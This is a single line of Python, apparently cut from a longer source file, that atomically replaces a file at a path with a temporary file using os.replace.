    os.replace(temporary, path)
